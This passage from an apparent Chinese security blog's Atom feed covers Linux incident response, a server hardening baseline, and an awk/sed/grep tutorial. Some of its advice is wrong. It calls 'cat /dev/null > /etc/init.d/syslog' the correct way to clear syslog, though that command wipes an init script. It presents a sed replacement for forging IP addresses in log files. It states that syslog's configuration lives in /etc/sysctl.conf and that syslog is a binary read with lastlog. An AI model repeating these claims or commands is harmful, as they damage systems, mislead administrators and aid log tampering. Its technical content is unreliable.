align="center">记录<strong>错误登录（登陆失败）</strong>日志；使用<strong>lastb</strong>命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询ssh登录记录</span></span><br><span class="line">more /var/<span class="built_in">log</span>/secure</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装软件的日志-&gt; Centos</span></span><br><span class="line">/var/<span class="built_in">log</span>/yum.log</span><br><span class="line"><span class="comment">#安装软件的日志-&gt; Ubuntu</span></span><br><span class="line">/var/<span class="built_in">log</span>/apt/</span><br></pre></td></tr></table></figure><p><strong>/var/log/syslog：</strong>只记录警告信息，常常是系统出问题的信息；</p><blockquote><p>syslog是Linux系统默认的日志守护进程</p><p>默认的syslog配置文件是/etc/sysctl.conf文件</p><p><strong>syslog不可以使用vi等工具直接查看，它是二进制文件，使用 lastlog 查看</strong></p></blockquote><p>默认Centos，Fedora不生成该日志文件，但可以配置让系统生成该日志文件</p><p><code>/etc/rsyslog.conf</code>文件中加上：<code>*.warning /var/log/syslog</code> </p><p>该日志文件能记录当用户登录时login记录下的错误口令、Sendmail的问题、su命令执行失败等信息 </p><p><strong>正确清空syslog日志的方式</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /dev/null &gt; /etc/init.d/syslog</span><br></pre></td></tr></table></figure><h1 id="WebShell检测"><a href="#WebShell检测" class="headerlink" title="WebShell检测"></a>WebShell检测</h1><p>常见的检测方法有<strong>基于主机的流量-文件-日志检测</strong>、<strong>关键字(危险函数)匹配</strong>、<strong>语义分析</strong>等</p><p>更多检测方法可以在知网搜索相关文献</p><h3 id="网站被植入WebShell的应急响应流程"><a href="#网站被植入WebShell的应急响应流程" class="headerlink" title="网站被植入WebShell的应急响应流程"></a>网站被植入WebShell的应急响应流程</h3><blockquote><p><strong>1、定位时间和范围</strong>：扫描WebShell位置，D盾、河马等工具；定位文件创建的时间；检查Web根目录.htaccess文件</p><p><strong>2、Web日志分析</strong>：例如查看access.log（Apache日志）在文件创建的时间的节点是否有可以上传</p><p><strong>3、漏洞分析</strong>：分析可能存在漏洞的地方，复现漏洞GetShell。</p><p><strong>4、漏洞修复</strong>：清除WebShell并修复漏洞</p><p><strong>5、对系统和Web应用进行安全加固</strong></p></blockquote><h1 id="查杀工具"><a href="#查杀工具" class="headerlink" title="查杀工具"></a>查杀工具</h1><p><a href="http://www.clamav.net/download.html" target="_blank" rel="noopener">杀软-Clamav</a></p><p><a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">chkrootkit</a>、<a href="http://rkhunter.sourceforge.net/" target="_blank" rel="noopener">rkhunter</a></p><p><a href="https://www.shellpub.com/" target="_blank" rel="noopener">河马webshell查杀</a></p><p><a href="https://github.com/grayddq/GScan" target="_blank" rel="noopener">GScan自动化检测脚本</a></p><p>其它参考：</p><p><a href="https://bypass007.github.io/Emergency-Response-Notes/" target="_blank" rel="noopener">Bypass师傅的应急响应笔记</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;应急响应模型&quot;&gt;&lt;a href=&quot;#应急响应模型&quot; class=&quot;headerlink&quot; title=&quot;应急响应模型&quot;&gt;&lt;/a&gt;应急响应模型&lt;/h1&gt;&lt;h3 id=&quot;PDCERF模型&quot;&gt;&lt;a href=&quot;#PDCERF模型&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="【3】红蓝对抗" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="【十 蓝队】应急响应" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%90%E5%8D%81-%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
  </entry>
  
  <entry>
    <title>【1 蓝队】Linux安全加固</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</id>
    <published>2020-08-12T12:09:00.000Z</published>
    <updated>2020-08-21T08:08:25.700Z</updated>
    
    <content type="html"><![CDATA[<h1 id="账号和口令"><a href="#账号和口令" class="headerlink" title="账号和口令"></a>账号和口令</h1><h2 id="1-1-禁用或删除无用账号"><a href="#1-1-禁用或删除无用账号" class="headerlink" title="1.1 禁用或删除无用账号"></a>1.1 禁用或删除无用账号</h2><p>减少系统无用账号，降低安全风险。</p><p><strong>操作步骤</strong></p><ul><li>使用命令 <code>userdel &lt;用户名&gt;</code> 删除不必要的账号。</li><li>使用命令 <code>passwd -l &lt;用户名&gt;</code> 锁定不必要的账号。</li><li>使用命令 <code>passwd -u &lt;用户名&gt;</code> 解锁必要的账号。</li></ul><h2 id="1-2-检查特殊账号"><a href="#1-2-检查特殊账号" class="headerlink" title="1.2 检查特殊账号"></a>1.2 检查特殊账号</h2><p>检查是否存在空口令和root权限的账号。</p><p><strong>操作步骤</strong></p><ol><li>查看空口令和root权限账号，确认是否存在异常账号：<ul><li>使用命令 <code>awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow</code> 查看空口令账号。</li><li>使用命令 <code>awk -F: &#39;($3==0)&#39; /etc/passwd</code> 查看UID为零的账号。</li></ul></li><li>加固空口令账号：<ul><li>使用命令 <code>passwd &lt;用户名&gt;</code> 为空口令账号设定密码。</li><li>确认UID为零的账号只有root账号。</li></ul></li></ol><h2 id="1-3-添加口令策略"><a href="#1-3-添加口令策略" class="headerlink" title="1.3 添加口令策略"></a>1.3 添加口令策略</h2><p>加强口令的复杂度等，降低被猜解的可能性。</p><p><strong>操作步骤</strong></p><ol><li><p>使用命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/login.defs</span><br></pre></td></tr></table></figure><p>修改配置文件。</p><ul><li><code>PASS_MAX_DAYS 90 #新建用户的密码最长使用天数</code></li><li><code>PASS_MIN_DAYS 0 #新建用户的密码最短使用天数</code></li><li><code>PASS_WARN_AGE 7 #新建用户的密码到期提前提醒天数</code></li></ul></li><li><p>使用chage命令修改用户设置。<br>例如，<code>chage -m 0 -M 30 -E 2000-01-01 -W 7 &lt;用户名&gt;</code>表示将此用户的密码最长使用天数设为30，最短使用天数设为0，密码2000年1月1日过期，过期前七天警告用户。</p></li><li><p>设置连续输错三次密码，账号锁定五分钟。使用命令 <code>vi /etc/pam.d/common-auth</code>修改配置文件，在配置文件中添加 <code>auth required pam_tally.so onerr=fail deny=3 unlock_time=300</code>。</p></li></ol><h2 id="1-4-限制用户su"><a href="#1-4-限制用户su" class="headerlink" title="1.4 限制用户su"></a>1.4 限制用户su</h2><p>限制能su到root的用户。</p><p><strong>操作步骤</strong></p><p>使用命令 <code>vi /etc/pam.d/su</code>修改配置文件，在配置文件中添加行。例如，只允许test组用户su到root，则添加 <code>auth required pam_wheel.so group=test</code>。</p><h2 id="1-4-禁止root用户直接登录"><a href="#1-4-禁止root用户直接登录" class="headerlink" title="1.4 禁止root用户直接登录"></a>1.4 禁止root用户直接登录</h2><p>限制root用户直接登录。</p><p><strong>操作步骤</strong></p><ol><li>创建普通权限账号并配置密码,防止无法远程登录;</li><li>使用命令 <code>vi /etc/ssh/sshd_config</code>修改配置文件将PermitRootLogin的值改成no，并保存，然后使用<code>service sshd restart</code>重启服务。</li></ol><h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><h2 id="2-1-关闭不必要的服务"><a href="#2-1-关闭不必要的服务" class="headerlink" title="2.1 关闭不必要的服务"></a>2.1 关闭不必要的服务</h2><p>关闭不必要的服务（如普通服务和xinetd服务），降低风险。</p><p><strong>操作步骤</strong></p><p>使用命令<code>systemctl disable &lt;服务名&gt;</code>设置服务在开机时不自动启动。</p><p><strong>说明</strong>： </p><p>对于部分老版本的Linux操作系统（如CentOS 6），可以使用命令<code>chkconfig --level  &lt;服务名&gt; off</code></p><p>设置服务在指定init级别下开机时不自动启动。</p><h2 id="2-2-SSH服务安全"><a href="#2-2-SSH服务安全" class="headerlink" title="2.2 SSH服务安全"></a>2.2 SSH服务安全</h2><p>对SSH服务进行安全加固，防止暴力破解成功。</p><p><strong>操作步骤</strong></p><p>使用命令 <code>vim /etc/ssh/sshd_config</code> 编辑配置文件。</p><ul><li>不允许root账号直接登录系统。<br>设置 PermitRootLogin 的值为 no。</li><li>修改SSH使用的协议版本。<br>设置 Protocol 的版本为 2。</li><li>修改允许密码错误次数（默认6次）。<br>设置 MaxAuthTries 的值为 3。</li></ul><p>配置文件修改完成后，重启sshd服务生效。</p><h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="Linux文件系统文件格式分类"><a href="#Linux文件系统文件格式分类" class="headerlink" title="Linux文件系统文件格式分类"></a>Linux文件系统文件格式分类</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">df -T<span class="comment">#查看已经挂载的分区和文件系统类型</span></span><br></pre></td></tr></table></figure><h4 id="常见的文件系统有："><a href="#常见的文件系统有：" class="headerlink" title="常见的文件系统有："></a><strong>常见的文件系统有：</strong></h4><blockquote><p><strong>ext4：</strong>4级扩展文件系统，启动快，文件易恢复；</p><p><strong>ReiserFS：</strong>日志型文件系统，效率高；</p><p><strong>NTF：</strong>网络文件系统，一种分布式文件系统，不同机器能共享文件</p><p><strong>tmpfs：</strong>临时文件系统，是一种基于内存的文件系统 </p><p><strong>xfs：</strong>一种高性能日志系统</p></blockquote><h4 id="常见文件格式有："><a href="#常见文件格式有：" class="headerlink" title="常见文件格式有："></a><strong>常见文件格式有：</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file *<span class="comment">#查看文件详细信息，格式类型</span></span><br></pre></td></tr></table></figure><blockquote><p> <strong>ASCII text</strong>      纯文本文件</p><p><strong>binary(ELF)</strong>    二进制文件</p><p><strong>data</strong>    数据文件</p><p><strong>directory</strong>    目录文件</p><p><strong>symbolic link</strong>    链接文件</p><p><strong>block special</strong>    块设备文件( 硬盘 )</p><p><strong>character special</strong>    字符设备文件（即串行端口的接口设备，例如键盘、鼠标 ）</p><p><strong>socket</strong>    套接字文件（ 通常用在网络数据连接 ）</p></blockquote><p><strong>检查系统中存在的 SUID 和 SGID 程序</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm +6000</span><br></pre></td></tr></table></figure><h2 id="3-1-设置umask值"><a href="#3-1-设置umask值" class="headerlink" title="3.1 设置umask值"></a>3.1 设置umask值</h2><p>设置默认的umask值，增强安全性。</p><p><strong>操作步骤</strong></p><p>使用命令 <code>vi /etc/profile</code> 修改配置文件，添加行 <code>umask 027</code>， 即新创建的文件属主拥有读写执行权限；</p><p>同组用户拥有读和执行权限，其他用户无权限。</p><h2 id="3-2-设置登录超时"><a href="#3-2-设置登录超时" class="headerlink" title="3.2 设置登录超时"></a>3.2 设置登录超时</h2><p>设置系统登录后，连接超时时间，增强安全性。</p><p><strong>操作步骤</strong></p><p>使用命令 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT=</code> 开头的行注释，设置为<code>TMOUT=180</code>，即超时时间为三分钟。</p><h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><h2 id="4-1-syslogd日志"><a href="#4-1-syslogd日志" class="headerlink" title="4.1 syslogd日志"></a>4.1 syslogd日志</h2><p>启用日志功能，并配置日志记录。</p><p><strong>操作步骤</strong></p><p>Linux系统默认启用以下类型日志：</p><ul><li>系统日志（默认）/var/log/messages</li><li>cron日志（默认）/var/log/cron</li><li>安全日志（默认）/var/log/secure</li></ul><p><strong>注意</strong>：</p><blockquote><p>部分系统可能使用syslog-ng日志，配置文件为：/etc/syslog-ng/syslog-ng.conf，可以根据需求配置详细日志。</p></blockquote><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/messages</td><td align="center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录<strong>错误登录（登陆失败）</strong>日志；使用<strong>lastb</strong>命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码</td></tr></tbody></table><h3 id="var-log-syslog："><a href="#var-log-syslog：" class="headerlink" title="var/log/syslog："></a>var/log/syslog：</h3><p><strong>只记录警告信息，常常是系统出问题的信息；</strong></p><blockquote><p>syslog是Linux系统默认的日志守护进程</p><p>默认的syslog配置文件是/etc/sysctl.conf文件</p><p><strong>syslog不可以使用vi等工具直接查看，它是二进制文件，使用 lastlog 查看</strong></p></blockquote><p>默认Centos，Fedora不生成该日志文件，但可以配置让系统生成该日志文件</p><p><code>/etc/rsyslog.conf</code>文件中加上：<code>*.warning /var/log/syslog</code> </p><p>该日志文件能记录当用户登录时login记录下的错误口令、Sendmail的问题、su命令执行失败等信息 </p><p><strong>正确清空syslog日志的方式</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /dev/null &gt; /etc/init.d/syslog</span><br></pre></td></tr></table></figure><h2 id="4-2-记录所有用户的登录和操作日志"><a href="#4-2-记录所有用户的登录和操作日志" class="headerlink" title="4.2 记录所有用户的登录和操作日志"></a>4.2 记录所有用户的登录和操作日志</h2><p>通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。</p><p><strong>操作步骤</strong></p><ol><li><p>运行 <code>[root@xxx /]# vim /etc/profile</code>打开配置文件。</p></li><li><p>在配置文件中输入以下内容：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br><span class="line">USER=`whoami`</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null| awk <span class="string">'&#123;print $NF&#125;'</span>|sed -e <span class="string">'s/[()]//g'</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$USER_IP</span>"</span> = <span class="string">""</span> ]; <span class="keyword">then</span></span><br><span class="line">USER_IP=`hostname`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d /var/<span class="built_in">log</span>/<span class="built_in">history</span> ]; <span class="keyword">then</span></span><br><span class="line">mkdir /var/<span class="built_in">log</span>/<span class="built_in">history</span></span><br><span class="line">chmod 777 /var/<span class="built_in">log</span>/<span class="built_in">history</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d /var/<span class="built_in">log</span>/<span class="built_in">history</span>/<span class="variable">$&#123;LOGNAME&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">mkdir /var/<span class="built_in">log</span>/<span class="built_in">history</span>/<span class="variable">$&#123;LOGNAME&#125;</span></span><br><span class="line">chmod 300 /var/<span class="built_in">log</span>/<span class="built_in">history</span>/<span class="variable">$&#123;LOGNAME&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">export</span> HISTSIZE=4096</span><br><span class="line">DT=`date +<span class="string">"%Y%m%d_%H:%M:%S"</span>`</span><br><span class="line"><span class="built_in">export</span> HISTFILE=<span class="string">"/var/log/history/<span class="variable">$&#123;LOGNAME&#125;</span>/<span class="variable">$&#123;USER&#125;</span>@<span class="variable">$&#123;USER_IP&#125;</span>_<span class="variable">$DT</span>"</span></span><br><span class="line">chmod 600 /var/<span class="built_in">log</span>/<span class="built_in">history</span>/<span class="variable">$&#123;LOGNAME&#125;</span>/*<span class="built_in">history</span>* 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li><li><p>运行 <code>[root@xxx /]# source /etc/profile</code> 加载配置生效。<br><strong>注意</strong>： /var/log/history 是记录日志的存放位置，可以自定义。</p></li></ol><blockquote><p>通过上述步骤，可以在 /var/log/history 目录下以每个用户为名新建一个文件夹；</p><p>每次用户退出后都会产生以用户名、登录IP、时间的日志文件，包含此用户本次的所有操作（root用户除外）</p><p>同时，建议使用OSS服务收集存储日志。</p></blockquote><h2 id="4-3日志审计方法"><a href="#4-3日志审计方法" class="headerlink" title="4.3日志审计方法"></a>4.3日志审计方法</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询ssh登录记录</span></span><br><span class="line">more /var/<span class="built_in">log</span>/secure</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装软件的日志-&gt; Centos</span></span><br><span class="line">more /var/<span class="built_in">log</span>/yum.log</span><br><span class="line"><span class="comment">#安装软件的日志-&gt; Ubuntu</span></span><br><span class="line">more /var/<span class="built_in">log</span>/apt/</span><br></pre></td></tr></table></figure><h3 id="相关工具：ELK、Goaccess"><a href="#相关工具：ELK、Goaccess" class="headerlink" title="相关工具：ELK、Goaccess"></a>相关工具：<a href="https://www.elastic.co/cn/products/" target="_blank" rel="noopener">ELK</a>、<a href="https://goaccess.cc/" target="_blank" rel="noopener">Goaccess</a></h3><h1 id="IP协议安全要求"><a href="#IP协议安全要求" class="headerlink" title="IP协议安全要求"></a>IP协议安全要求</h1><blockquote><ul><li>远程登录取消telnet采用ssh</li><li>设置/etc/hosts.allow和deny</li><li>禁止ICMP重定向</li><li>禁止源路由转发</li><li>防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)</li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;账号和口令&quot;&gt;&lt;a href=&quot;#账号和口令&quot; class=&quot;headerlink&quot; title=&quot;账号和口令&quot;&gt;&lt;/a&gt;账号和口令&lt;/h1&gt;&lt;h2 id=&quot;1-1-禁用或删除无用账号&quot;&gt;&lt;a href=&quot;#1-1-禁用或删除无用账号&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="【3】红蓝对抗" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="【8 蓝队】基线加固" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%908-%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>【8 操作系统】Linux三剑客</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E4%B8%89%E5%89%91%E5%AE%A2/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E4%B8%89%E5%89%91%E5%AE%A2/</id>
    <published>2020-08-12T12:08:00.000Z</published>
    <updated>2020-08-12T08:40:56.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文本分析AWK"><a href="#文本分析AWK" class="headerlink" title="文本分析AWK"></a>文本分析AWK</h1><blockquote><p><code>awk</code>是一种编程语言，用于在<code>linux/unix</code>下对文本和数据进行处理 ；</p><p>数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出； </p><p>它支持用户自定义函数和动态正则表达式；</p><p>awk有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势 </p></blockquote><h4 id="基本语法："><a href="#基本语法：" class="headerlink" title="基本语法："></a>基本语法：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk [options] <span class="string">'Pattern&#123;Action&#125;'</span> filename</span><br><span class="line"><span class="built_in">command</span> [选项 参数] <span class="string">'模式&#123;动作&#125;'</span>   文件</span><br></pre></td></tr></table></figure><h4 id="常用命令选项："><a href="#常用命令选项：" class="headerlink" title="常用命令选项："></a>常用命令选项：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-F fs<span class="comment">#fs指定命令分隔符，如 -F:  如果没有指定分割符，默认使用空格作为分隔符（或使用-v FS,FS是内置变量）</span></span><br><span class="line">-v var=value<span class="comment">#赋值一个用户定义变量，将外部变量传递给awk，比如使用-v OFS="+",指定输出分隔符</span></span><br><span class="line">-f script<span class="comment">#从脚本文件中读取awk命令</span></span><br></pre></td></tr></table></figure><h4 id="最简单的用法：只用action"><a href="#最简单的用法：只用action" class="headerlink" title="最简单的用法：只用action"></a>最简单的用法：只用action</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"hello world"</span> &gt; <span class="built_in">test</span></span><br><span class="line">$ awk <span class="string">'&#123;print&#125;'</span> <span class="built_in">test</span></span><br><span class="line">hello world</span><br><span class="line">$ awk <span class="string">'&#123;print $0&#125;'</span> <span class="built_in">test</span><span class="comment">#$0表示所有域(默认用空格当作分隔符)</span></span><br><span class="line">hello world</span><br><span class="line">$ awk <span class="string">'&#123;print $1&#125;'</span> <span class="built_in">test</span><span class="comment">#$1表示第一个域,两个域用逗号隔开$1,$2，去掉逗号或换为空格输出时会没有分隔符显示在一列</span></span><br><span class="line">hello</span><br><span class="line"><span class="comment">##############################</span></span><br><span class="line">df -h | awk <span class="string">'&#123;print $5&#125;'</span><span class="comment">#df显示磁盘使用情况，这里使用awk只打印每行的第五列，$NF可以只输出每行的最后一列</span></span><br></pre></td></tr></table></figure><h4 id="特殊模式的用法："><a href="#特殊模式的用法：" class="headerlink" title="特殊模式的用法："></a>特殊模式的用法：</h4><blockquote><p>BEGIN 模式指定了处理文本之前需要执行的操作：（BEGIN开始）；不指定文件也能输出（但是后边指定操作也会卡住）</p><p>END 模式指定了处理完所有行之后所需要执行的操作：（END结束）；不指定文件会卡住</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">'BEGIN&#123;print "wintrysec"&#125; &#123;print $0&#125; END&#123;print "1080"&#125;'</span> <span class="built_in">test</span></span><br><span class="line">wintrysec</span><br><span class="line">hello world</span><br><span class="line">1080</span><br></pre></td></tr></table></figure><h4 id="AWK变量："><a href="#AWK变量：" class="headerlink" title="AWK变量："></a>AWK变量：</h4><p><strong>常用内置变量：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FS<span class="comment">#输入字段分隔符， 默认为空白字符</span></span><br><span class="line">OFS<span class="comment">#输出字段分隔符， 默认为空白字符</span></span><br><span class="line">RS<span class="comment">#输入记录分隔符(默认输入是换行符)， 指定输入时的换行符</span></span><br><span class="line">ORS<span class="comment">#输出记录分隔符（输出换行符），输出时用指定符号代替换行符</span></span><br><span class="line">NF<span class="comment">#number of Field，当前行的字段的个数(即当前行被分割成了几列)，字段数量</span></span><br><span class="line">NR<span class="comment">#行号，当前处理的文本行的行号。</span></span><br><span class="line">FNR<span class="comment">#各文件分别计数的行号，另一个文件从1开始计行数</span></span><br><span class="line">ARGC<span class="comment">#命令行参数的个数</span></span><br><span class="line">ARGV<span class="comment">#数组，保存的是命令行所给定的各参数，AGRV[0]是awk</span></span><br><span class="line">FILENAME<span class="comment">#当前文件名</span></span><br></pre></td></tr></table></figure><p><strong>自定义变量的两种用法：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk -v name=<span class="string">"wintrysec"</span>,age=19 <span class="string">'BEGIN&#123;print name&#125;'</span><span class="comment">#第一种方法用-v选项，多个参数用逗号分隔   不加BENGIN会卡住</span></span><br><span class="line">wintrysec</span><br><span class="line">$ awk <span class="string">'BEGIN&#123;name="wintrysec";age=18;print name,age&#125;'</span><span class="comment">#第二种方法，直接在程序中定义，多个参数用分号分隔 </span></span><br><span class="line">wintrysec 18</span><br></pre></td></tr></table></figure><h1 id="文本批量处理sed"><a href="#文本批量处理sed" class="headerlink" title="文本批量处理sed"></a>文本批量处理sed</h1><blockquote><p>主要用来自动编辑一个或多个文件；简化对文件的反复操作； </p></blockquote><h4 id="命令格式："><a href="#命令格式：" class="headerlink" title="命令格式："></a>命令格式：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed [options] <span class="string">'command'</span> file(s)</span><br><span class="line">sed [options] -f scriptfile file(s)</span><br></pre></td></tr></table></figure><h4 id="常用选项："><a href="#常用选项：" class="headerlink" title="常用选项："></a>常用选项：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-e&lt;script&gt;<span class="comment">#以选项中的指定的script来处理输入的文本文件；</span></span><br><span class="line">-f&lt;script文件&gt; <span class="comment">#以选项中指定的script文件来处理输入的文本文件；</span></span><br><span class="line">-n<span class="comment">#仅显示script处理后的结果；</span></span><br></pre></td></tr></table></figure><h4 id="替换标记："><a href="#替换标记：" class="headerlink" title="替换标记："></a>替换标记：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">g<span class="comment">#表示行内全面替换；即替换每一行中的所有匹配</span></span><br><span class="line">p<span class="comment">#表示打印行。  </span></span><br><span class="line">w<span class="comment">#表示把行写入一个文件。  </span></span><br><span class="line">x<span class="comment">#表示互换模板块中的文本和缓冲区中的文本。  </span></span><br><span class="line">y<span class="comment">#表示把一个字符翻译为另外的字符（但是不用于正则表达式）</span></span><br><span class="line">\1<span class="comment">#子串匹配标记</span></span><br><span class="line">&amp;<span class="comment">#已匹配字符串标记</span></span><br></pre></td></tr></table></figure><h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><blockquote><p>d     删除，删除选择的行。<br>s     替换指定字符<br>p     打印模板块的行。<br>P    (大写) 打印模板块的第一行。</p></blockquote><h4 id="常见用法："><a href="#常见用法：" class="headerlink" title="常见用法："></a>常见用法：</h4><p><strong>替换文本中的字符串 (如linux日志处理，伪造IP)</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">'s/192.168.1.3/192.168.1.4/g'</span> xxx.log<span class="comment">#-i选项表示直接编辑文件</span></span><br></pre></td></tr></table></figure><p><strong>定界符：</strong></p><p>以上命令中字符 / 在sed中作为定界符使用，也可以使用任意的定界符：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">'s|test|TEXT|g'</span></span><br></pre></td></tr></table></figure><p>定界符出现在样式内部时，需要进行转义： </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">'s/\/bin/\/usr\/local\/bin/g'</span></span><br></pre></td></tr></table></figure><p><strong>删除操作(d命令)：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">'/^$/d'</span> file<span class="comment">#删除空白行</span></span><br><span class="line">sed <span class="string">'2d'</span> file<span class="comment">#删除文件的第二行</span></span><br><span class="line">sed <span class="string">'2,$d'</span> file<span class="comment">#删除文件的第2行到末尾所有行</span></span><br><span class="line">sed <span class="string">'$d'</span> file <span class="comment">#删除文件最后一行</span></span><br><span class="line">sed <span class="string">'/^test/'</span>d file<span class="comment">#删除文件中所有开头是test的行</span></span><br></pre></td></tr></table></figure><h4 id="常见面试题"><a href="#常见面试题" class="headerlink" title="常见面试题"></a>常见面试题</h4><p>把/oldboy目录以及子目录下所有以扩展名为.sh结尾的文件包含oldboy的字符串全部替换为oldgirl</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /oldboy -<span class="built_in">type</span> f -name <span class="string">"*.sh"</span>|xargs sed <span class="string">"s#oldboy#oldgirl#g"</span></span><br></pre></td></tr></table></figure><h1 id="grep文本正则匹配"><a href="#grep文本正则匹配" class="headerlink" title="grep文本正则匹配"></a>grep文本正则匹配</h1><p><strong>常见用法：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">"text"</span> file_name<span class="comment">#返回一个包含text的文本行</span></span><br><span class="line">grep <span class="string">"text"</span> file1 file2<span 